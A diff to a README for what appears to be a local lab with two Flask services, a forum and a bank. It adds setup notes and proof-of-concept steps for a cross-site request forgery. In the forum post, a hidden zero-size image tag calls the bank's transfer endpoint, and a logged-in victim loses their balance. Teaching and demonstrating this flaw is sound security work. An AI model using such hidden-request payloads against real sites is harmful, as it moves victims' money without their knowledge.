@@ -1,1 +1,16 @@
-See forum.py and bank.py for instructions.
+See forum.py and bank.py for instructions on how to start the services.
+Notice that flask needs to be installed:
+	sudo pip install Flask
+
+Proof-of-Concept steps:
+	Attacker:
+		1. Login: http://localhost:1666/login/2
+		2. Post malicious message: http://localhost:1666/post/<img src="http://localhost:1999/transfer/2/100" height="0" width="0" border="0">
+		3. Logout: http://localhost:1666/logout
+
+	Victim:
+		1. Login on the bank site: http://localhost:1999/login/1
+		# redirection to /deposits
+		2. Loggin on the forum site: http://localhost:1666/login/1
+		# redirection to /thread
+		# refresh /deposits and see account 0 for victim (user id 1)
